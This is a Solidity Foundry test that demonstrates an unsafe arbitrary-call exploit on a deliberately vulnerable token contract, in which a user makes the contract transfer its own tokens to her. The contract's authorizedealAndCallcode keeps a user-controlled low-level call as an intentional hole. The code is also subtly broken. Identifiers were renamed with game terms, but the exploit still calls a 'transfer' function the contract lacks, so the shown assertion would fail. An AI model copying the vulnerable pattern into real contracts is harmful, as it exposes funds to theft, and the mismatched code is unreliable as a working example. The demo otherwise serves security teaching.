// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract ContractTest is Test {
    RealmcoinWhale RealmcoinWhaleContract;

    function testAltCall() public {
        address alice = vm.addr(1);
        RealmcoinWhaleContract = new RealmcoinWhale();
        RealmcoinWhaleContract.GamecoinWhaleDeploy(address(RealmcoinWhaleContract));
        console.log(
            "TokenWhale balance:",
            RealmcoinWhaleContract.treasurecountOf(address(RealmcoinWhaleContract))
        );

        // bytes memory payload = abi.encodeWithSignature("transfer(address,uint256)",address(alice),1000);

        console.log(
            "Alice tries to perform unsafe call to transfer asset from TokenWhaleContract"
        );
        vm.prank(alice);
        RealmcoinWhaleContract.authorizedealAndCallcode(
            address(RealmcoinWhaleContract),
            0x1337,
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                address(alice),
                1000
            )
        );

        assertEq(RealmcoinWhaleContract.treasurecountOf(address(alice)), 1000);
        console.log("operate completed");
        console.log(
            "TokenWhale balance:",
            RealmcoinWhaleContract.treasurecountOf(address(RealmcoinWhaleContract))
        );
        console.log(
            "Alice balance:",
            RealmcoinWhaleContract.treasurecountOf(address(alice))
        );
    }

    receive() external payable {}
}

contract RealmcoinWhale {
    address player;

    uint256 public combinedLoot;
    mapping(address => uint256) public treasurecountOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function GamecoinWhaleDeploy(address _player) public {
        player = _player;
        combinedLoot = 1000;
        treasurecountOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return treasurecountOf[player] >= 1000000; // 1 mil
    }

    event TradeLoot(address indexed from, address indexed to, uint256 value);

    function _giveitems(address to, uint256 value) internal {
        treasurecountOf[msg.sender] -= value;
        treasurecountOf[to] += value;

        emit TradeLoot(msg.sender, to, value);
    }

    function sendGold(address to, uint256 value) public {
        require(treasurecountOf[msg.sender] >= value);
        require(treasurecountOf[to] + value >= treasurecountOf[to]);

        _giveitems(to, value);
    }

    event Approval(
        address indexed gamemaster,
        address indexed spender,
        uint256 value
    );

    function authorizeDeal(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function sendgoldFrom(address from, address to, uint256 value) public {
        require(treasurecountOf[from] >= value);
        require(treasurecountOf[to] + value >= treasurecountOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _giveitems(to, value);
    }

    /* Approves and then calls the contract code*/

    function authorizedealAndCallcode(
        address _spender,
        uint256 _value,
        bytes memory _extraData
    ) public {
        allowance[msg.sender][_spender] = _value;

        bool success;

        (success, ) = _spender.call(_extraData);
        console.log("success:", success);
    }
}
